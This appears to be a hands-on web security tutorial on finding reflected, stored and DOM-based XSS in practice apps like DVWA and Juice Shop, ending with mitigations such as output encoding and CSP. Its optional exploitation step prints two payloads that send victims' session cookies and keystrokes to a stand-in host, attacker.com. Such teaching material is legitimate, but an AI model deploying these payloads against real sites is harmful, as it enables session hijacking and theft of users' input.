# Hands-on XSS (Cross-Site Scripting)

Cross-Site Scripting (XSS) is one of the most common vulnerabilities found in web applications. It occurs when an attacker is able to inject malicious scripts into webpages viewed by other users. These scripts are executed in the browser, allowing attackers to steal sensitive information, such as session cookies, or perform malicious actions on behalf of the user.

In this hands-on guide, we will explore how to identify and exploit XSS vulnerabilities in a practical environment. We will focus on **Reflected XSS**, **Stored XSS**, and **DOM-based XSS**.

## Prerequisites

1. **Test Environment:** Set up a local vulnerable web application (e.g., [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/), [DVWA (Damn Vulnerable Web Application)](http://www.dvwa.co.uk/)).
2. **Tools:**
   - Browser Developer Tools (for inspecting requests and responses)
   - Burp Suite or OWASP ZAP (for scanning vulnerabilities)
   - Payloads for testing XSS (e.g., `"<script>alert('XSS')</script>"`)

## Steps to Conduct the Practical XSS Testing

### Step 1: Setting up a Vulnerable Application

1. Download and set up a vulnerable application like **OWASP Juice Shop** or **DVWA**.
   - For **OWASP Juice Shop**, follow the installation instructions [here](https://owasp.org/www-project-juice-shop/).
   - For **DVWA**, download from [here](http://www.dvwa.co.uk/) and set up a local server (using XAMPP, WAMP, etc.).

2. Once the application is set up, log into the admin panel or user interface and begin testing for XSS vulnerabilities.

### Step 2: Finding Input Fields

Look for user input fields on the application where the input is reflected back to the user. Common places include:
- Search bars
- Contact forms
- Login fields
- Comment sections
- URL query parameters

### Step 3: Testing for Reflected XSS

1. In the input field (e.g., search bar), inject the following payload:

   ```html
   <script>alert('Reflected XSS')</script>
   ```

2. Submit the input and check if the script is reflected in the output. If an alert box pops up with the message 'Reflected XSS', this is a Reflected XSS vulnerability.

Example URL:

```php
http://localhost/search?q=<script>alert('XSS')</script>
```
### Step 4: Testing for Stored XSS
1. Find a section of the application where user input is stored on the server (e.g., a comment section, blog post input).

2. Inject the following payload in the input field:

```html
<script>alert('Stored XSS')</script>
```
3. Submit the form and then reload the page. If the script runs on the page load, this is a Stored XSS vulnerability.

### Step 5: Testing for DOM-based XSS
1. Inspect the webpage for JavaScript that dynamically manipulates the DOM based on user input (e.g., through the URL or form).
2. Modify the URL or form input to inject a malicious payload:

```html
 javascript:alert('DOM-based XSS')
```
3. Check if the injected script executes within the browser, reflecting unsafe dynamic DOM changes.

### Step 6: Exploiting XSS (Optional)
1. Session Hijacking: Use JavaScript to steal session cookies or authentication tokens.

Example payload to steal cookies:
```html
<script>document.location='http://attacker.com/steal?cookie=' + document.cookie;</script>
```

2. Keylogging: Capture user keystrokes via JavaScript.

Example payload:
``html
<script>document.onkeydown = function(e) { fetch('http://attacker.com/keylog?key=' + e.key); }</script>
```

## Mitigating XSS Vulnerabilities
1. Input Validation and Sanitization: Always validate and sanitize user inputs to remove potentially dangerous characters.

Use libraries like OWASP Java Encoder for safe encoding.

2. Output Encoding: Encode dynamic data before injecting it into HTML, JavaScript, or other places where it could be interpreted as code.

Use context-aware encoding for different contexts (HTML, JavaScript, CSS, URL).

3. Content Security Policy (CSP): Use a Content Security Policy to restrict the sources from which scripts can be loaded.

Example CSP Header:

```css
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```
4. HTTPOnly and Secure Cookies: Set the HTTPOnly and Secure flags for cookies to prevent client-side access to sensitive data.

Cross-Origin Resource Sharing (CORS): Implement proper CORS policies to prevent unauthorized cross-site requests.

### Conclusion
XSS attacks can have severe consequences if not mitigated properly. In this hands-on exercise, we've seen how to test for various types of XSS vulnerabilities and how to exploit them in a controlled environment. Always sanitize and validate user inputs, and use security headers like CSP to prevent XSS attacks.
